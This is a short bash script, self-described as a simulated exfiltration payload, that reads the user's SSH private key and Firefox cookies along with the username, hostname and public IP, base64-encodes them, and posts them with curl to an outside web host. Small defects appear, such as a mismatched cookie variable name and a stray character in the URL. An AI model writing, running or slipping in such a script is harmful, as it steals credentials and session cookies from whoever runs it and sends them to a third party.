#!/bin/bash
# malicious payload script to simulate data exfiltration to a cloudflare endpoint

# collect sensitive information
username=$(whoami)
hostname=$(hostname)
ip_address=$(curl -s https://api.ipify.org)
ssh_keys=$(cat ~/.ssh/id_rsa 2>/dev/null)

# locate the default firefox profile
firefox_profile=$(find ~/.mozilla/firefox -name '*.default-release' -print -quit)

# extract cookies from the sqlite database
firefox_cookies=$(sqlite3 "$firefox_profile/cookies.sqlite" "SELECT host, name, value FROM moz_cookies;")


# package the data
payload="USER=$username HOST=$hostname IP=$ip_address SSH_KEYS=$ssh_keys COOKIES=$browser_cookies"
encoded_payload=$(echo $payload | base64)

# exfiltrate the data to the cloudflare pages endpoint
curl -X POST -H "Content-Type: application/json" \
     -d "{\"data\":\"$encoded_payload\"}" \
     https://masonmelead.com>/log

# clean up traces (for simulation, this does nothing harmful)
echo "Test payload sent to Cloudflare Pages"